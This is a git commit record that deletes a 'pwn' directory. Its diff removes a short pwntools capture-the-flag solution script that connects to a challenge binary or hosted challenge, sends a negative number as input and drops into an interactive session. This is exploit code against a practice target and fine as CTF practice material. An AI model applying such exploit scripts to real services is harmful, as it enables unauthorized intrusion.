2979807cb2c7934cd7a737e5bed1de55a77dd0b8
Tyler Dionne <143131384+tylerdionne@users.noreply.github.com>
2024-02-19 08:47:40 -0500

    Delete pwn directory

--- pwn/asmallmisunderstanding.py
+++
@@ -1,6 +0,0 @@
-from pwn import *
-#p=remote("fitsec-a-small-misunderstanding.chals.io", 443, ssl=True, sni="fitsec-a-small-misunderstanding.chals.io")
-p = process("./asmallmisunderstanding.bin")
-p.recvuntil(">>>")
-p.sendline(b"%d"%-1)
-p.interactive()
